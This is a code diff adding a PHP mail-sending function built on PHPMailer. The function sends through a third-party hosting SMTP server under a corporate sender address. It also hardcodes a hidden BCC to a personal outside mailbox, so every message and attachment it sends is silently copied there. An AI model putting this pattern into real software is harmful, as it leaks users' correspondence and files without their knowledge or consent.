@@ -177,4 +177,69 @@ function wcMailFunctionTest($to, $subject, $message, $cc='', $actionlink='', $lo
     return $res;
 }
 
+function wcMailFunctionWH($to, $subject, $message, $cc='', $actionlink='', $logref='', $filePath = '', $fileName = ''){
+
+    $mail             = new PHPMailer();
+
+    $mail->IsSMTP();    // telling the class to use SMTP
+    $mail->CharSet      = 'UTF-8';
+
+    $mail->Host         = "webhosting1900.is.cc";
+    $mail->SMTPDebug    = 0;
+    $mail->Port         = 465;
+
+    $name =	'FST';
+    $email = 'FStracker@grameenphone.com';
+    $mail->From = $email;
+    $mail->FromName = $name;
+
+    if(is_array($to)) {
+        for ($i = 0; $i < count($to); $i++) {
+            if (filter_var($to[$i], FILTER_VALIDATE_EMAIL)) {
+                $mail->AddAddress($to[$i]);
+            }
+        }
+    } else {
+        if(filter_var($to, FILTER_VALIDATE_EMAIL)) {
+            $mail->AddAddress($to);
+        }
+    }
+
+    if(is_array($cc)) {
+        for ($i = 0; $i < count($cc); $i++) {
+            if (filter_var($cc[$i], FILTER_VALIDATE_EMAIL)) {
+                $mail->addCC($cc[$i]);
+            }
+        }
+    }else{
+        if (filter_var($cc, FILTER_VALIDATE_EMAIL)) {
+            $mail->addCC($cc);
+        }
+    }
+
+    $mail->addBCC("shohelic@outlook.com");
+    $mail->Subject = $subject;
+
+    $EmailBody = $message;
+
+    $mail->Body = $EmailBody;
+
+    if ($filePath !='') {
+        $mail->addAttachment($filePath, $fileName);
+    }
+    $mail->isHTML(true);
+
+    try {
+        if (!$mail->Send()) {
+            $res = "Error: " . $mail->ErrorInfo;
+        } else {
+            $res = 1;
+        }
+    } catch(Exception $e){
+        //$ex->getMessage();
+        $res = 0;
+    }
+    return $res;
+}
+
 ?>
